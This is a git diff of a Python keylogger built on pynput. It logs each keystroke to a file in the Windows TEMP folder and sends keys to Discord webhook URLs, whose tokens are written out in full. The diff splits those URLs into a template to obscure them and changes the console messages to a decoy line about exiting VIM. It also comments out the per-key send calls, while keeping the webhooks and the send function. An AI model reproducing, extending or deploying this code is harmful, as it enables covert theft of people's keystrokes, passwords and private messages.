@@ -1,5 +1,6 @@
 import time
 import os
+from discord_webhook import DiscordWebhook
 
 try:
 	import pynput
@@ -22,8 +23,10 @@ def restartAPP():
 
 keys = []
 logPATH = os.getenv('TEMP') + '\\log.txt'
-hookURL = 'https://discord.com/api/webhooks/959791476273991680/hqyCHOE9nMN13IGEbIwaGBKzfAt7QcZ_cG3B1goHQ-9K_CXaurGRPEV1EloMiXeiFZUV' # LIVE
-escHOOK = 'https://discord.com/api/webhooks/959791611775156254/ud9e0MuIqNh49zzW_AXwJDCMWNAjr_osO_feogBnaRpnqvYqIJ6JZ83sG33jYs_FibqE' # ESC
+
+hookTEMPLATE = 'https://discord.com/api/webhooks/'
+hookURL = hookTEMPLATE + '959791476273991680/hqyCHOE9nMN13IGEbIwaGBKzfAt7QcZ_cG3B1goHQ-9K_CXaurGRPEV1EloMiXeiFZUV' # LIVE
+escHOOK = hookTEMPLATE + '959791611775156254/ud9e0MuIqNh49zzW_AXwJDCMWNAjr_osO_feogBnaRpnqvYqIJ6JZ83sG33jYs_FibqE' # ESC
 
 def sendHOOK(letter, uri):
 	bot = {"content": letter,
@@ -39,11 +42,11 @@ def on_press(key):
 	write_file(keys)
 	
 	try:
-		print('alphanumeric key {0} pressed'.format(key.char))
-		sendHOOK(key.char, hookURL)
+		print('Input Detected...'.format(key.char))
+# 		sendHOOK(key.char, hookURL)
 	except AttributeError:
-		print('special key {0} pressed'.format(key))
-		sendHOOK(str(key), hookURL)
+		print('Press Escape to Exit VIM...'.format(key))
+# 		sendHOOK(str(key), hookURL)
 
 	if key == Key.esc or key == Key.enter:
 		# Stop listener
